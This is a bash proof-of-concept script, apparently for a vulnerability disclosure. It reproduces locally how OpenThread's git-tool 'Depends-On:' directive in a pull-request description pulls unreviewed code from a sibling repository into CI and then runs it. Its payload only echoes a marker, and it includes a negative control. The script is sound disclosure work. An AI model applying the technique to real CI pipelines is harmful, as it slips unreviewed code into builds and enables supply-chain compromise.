#!/bin/bash
# Local replay of the OpenThread "Depends-On:" pull-request-body directive.
#
# Zero network, zero writes outside a temp dir, ~5 seconds, no GitHub account.
#
# What it shows: the *description* of a pull request selects which code the CI
# builds and runs, and that code comes from a DIFFERENT repository than the one
# under review - so it never appears in the reviewed diff, and a reviewer of the
# visible diff has nothing to look at.
#
# The script/git-tool used here is a byte-identical copy of
# openthread/openthread @ 227561fe (sha256 BF5EA41A...), so the parsing and the
# pull are upstream code, not a re-implementation.

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
GIT_TOOL="${REPO_ROOT}/script/git-tool"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

MARKER="MARKER-$$-$(date +%s)"

echo "==============================================================="
echo " 1. a scratch sibling repository, laid out as <owner>/<repo>.git"
echo "==============================================================="
# script/git-tool derives the directive repository prefix from the CLONE URL:
#   project_name = $(git remote get-url origin | grep -oE '[^/:]+/[^/:]+\.git$' | cut -d. -f1)
# so the clone must look like .../openthread/ot-ns.git for the directive below to
# match - exactly the shape of the real consumer clones (openthread/ot-ns,
# openthread/ot-nrf528xx, openthread/ot-br-posix, openthread/ot-commissioner).
SIB="${WORK}/origin/openthread/ot-ns.git"
mkdir -p "${WORK}/origin/openthread"
git init --bare -q "${SIB}"

git init -q "${WORK}/seed"
cd "${WORK}/seed"
git config user.email "repro@example.invalid"
git config user.name "repro"
echo "baseline" > README.md
git add README.md
git commit -qm "baseline"
git branch -M main
git remote add origin "${SIB}"
git push -q origin main

echo
echo "==============================================================="
echo " 2. attacker content, sitting in a pull request of that repo"
echo "==============================================================="
git checkout -q -b attacker
printf '%s\n' "${MARKER}" > MARKER.txt
mkdir -p script
printf '#!/bin/bash\necho "ATTACKER-SCRIPT-EXECUTED marker=%s"\n' "${MARKER}" > script/marker.sh
chmod +x script/marker.sh
git add -A
git commit -qm "attacker content"
git checkout -q main
git merge -q --no-ff attacker -m "Merge pull/42/merge"
git push -q origin "HEAD:refs/pull/42/merge"
echo "created refs/pull/42/merge in the sibling repository"

echo
echo "==============================================================="
echo " 3. THE ATTACK: a pull-request DESCRIPTION selects that PR"
echo "==============================================================="
export PR_BODY="A perfectly normal looking pull request description.
Depends-On: openthread/ot-ns#42"
echo "PR_BODY:"
printf '%s\n' "${PR_BODY}" | sed 's/^/    | /'
echo
"${GIT_TOOL}" clone "${SIB}" "${WORK}/clone" > "${WORK}/trace.log" 2>&1 || true

echo "the lines that did it:"
grep -aE "project name:|cut -d#|git pull" "${WORK}/trace.log" | head -10 | sed 's/^/    /'

echo
echo "==============================================================="
echo " 4. what landed in the CI workspace (unreviewed content)"
echo "==============================================================="
ls -1 "${WORK}/clone" | sed 's/^/    /'
echo "    MARKER.txt: $(cat "${WORK}/clone/MARKER.txt" 2>/dev/null || echo MISSING)"
echo "    executing the pulled script:"
bash "${WORK}/clone/script/marker.sh" 2>/dev/null | sed 's/^/    /' || echo "    (script not present)"

echo
echo "==============================================================="
echo " 5. negative control: same clone, no directive in the description"
echo "==============================================================="
( unset PR_BODY; "${GIT_TOOL}" clone "${SIB}" "${WORK}/clone-nc" > "${WORK}/nc.log" 2>&1 || true )
if [ -e "${WORK}/clone-nc/MARKER.txt" ]; then
    echo "    UNEXPECTED: marker present without a directive"
    exit 1
fi
echo "    OK: no pull happened, no marker in the workspace"
grep -aE "project name:" "${WORK}/nc.log" | head -3 | sed 's/^/    /'

echo
echo "==============================================================="
echo " done: the pull-request DESCRIPTION chose the code that ran."
echo "==============================================================="
